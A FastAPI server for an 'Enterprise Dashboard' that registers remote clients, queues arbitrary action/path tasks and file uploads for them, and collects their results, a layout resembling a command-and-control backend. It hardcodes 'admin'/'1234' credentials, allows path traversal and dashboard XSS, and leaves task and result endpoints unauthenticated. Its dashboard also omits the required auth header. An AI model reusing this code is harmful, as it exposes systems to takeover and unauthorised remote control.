from fastapi import FastAPI, UploadFile, File, Form, Header
from fastapi.responses import HTMLResponse
import os, time, uuid

app = FastAPI()

clients = {}
tasks = {}
results = {}
sessions = {}

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------------- AUTH ----------------
USERS = {"admin": "1234"}

@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    if USERS.get(username) == password:
        token = str(uuid.uuid4())
        sessions[token] = username
        return {"token": token}
    return {"error": "invalid"}

def verify(token):
    return token in sessions

# ---------------- CLIENT ----------------
@app.post("/register")
def register(system_id: str = Form(...)):
    clients[system_id] = time.time()
    return {"ok": True}

@app.get("/clients")
def get_clients():
    now = time.time()
    return {c: "online" for c,t in clients.items() if now-t < 15}

# ---------------- CHUNK UPLOAD ----------------
@app.post("/upload_chunk")
async def upload_chunk(system_id: str = Form(...), filename: str = Form(...), chunk_id: int = Form(...), file: UploadFile = File(...), token: str = Header(...)):
    if not verify(token):
        return {"error": "unauthorized"}

    folder = f"{UPLOAD_DIR}/{system_id}_{filename}"
    os.makedirs(folder, exist_ok=True)

    with open(f"{folder}/{chunk_id}.part", "wb") as f:
        f.write(await file.read())

    return {"ok": True}

@app.post("/complete")
def complete(system_id: str = Form(...), filename: str = Form(...), total_chunks: int = Form(...), token: str = Header(...)):
    if not verify(token):
        return {"error": "unauthorized"}

    tasks[system_id] = {
        "action": "assemble",
        "filename": filename,
        "total": total_chunks
    }
    return {"ok": True}

# ---------------- TASK ----------------
@app.post("/task")
def task(system_id: str = Form(...), action: str = Form(...), path: str = Form(""), token: str = Header(...)):
    if not verify(token):
        return {"error": "unauthorized"}

    tasks[system_id] = {"action": action, "path": path}
    return {"ok": True}

@app.get("/task/{system_id}")
def get_task(system_id: str):
    return tasks.pop(system_id, {"action": None})

@app.post("/result")
def result(system_id: str = Form(...), data: str = Form(...)):
    results[system_id] = data
    return {"ok": True}

@app.get("/result/{system_id}")
def get_result(system_id: str):
    return results.pop(system_id, {})

# ---------------- DASHBOARD ----------------
@app.get("/dashboard", response_class=HTMLResponse)
def dashboard():
    return """
    <html>
    <body>
    <h2>Enterprise Dashboard</h2>
    <div id="clients"></div>

    <script>
    async function load(){
        let r = await fetch('/clients');
        let data = await r.json();

        let html = "";
        for(let c in data){
            html += `<p>${c} <button onclick="send('${c}')">Send</button></p>`;
        }
        document.getElementById("clients").innerHTML = html;
    }

    async function send(c){
        let f = document.createElement('input');
        f.type='file';

        f.onchange = async e=>{
            let file = e.target.files[0];
            let size = 1024*1024;
            let total = Math.ceil(file.size/size);

            for(let i=0;i<total;i++){
                let chunk = file.slice(i*size,(i+1)*size);
                let fd = new FormData();

                fd.append("system_id",c);
                fd.append("filename",file.name);
                fd.append("chunk_id",i);
                fd.append("file",chunk);

                await fetch('/upload_chunk',{method:'POST',body:fd});
            }

            await fetch('/complete',{
                method:'POST',
                body:new URLSearchParams({
                    system_id:c,
                    filename:file.name,
                    total_chunks:total
                })
            });

            alert("Done");
        };
        f.click();
    }

    setInterval(load,3000);
    load();
    </script>
    </body>
    </html>
    """
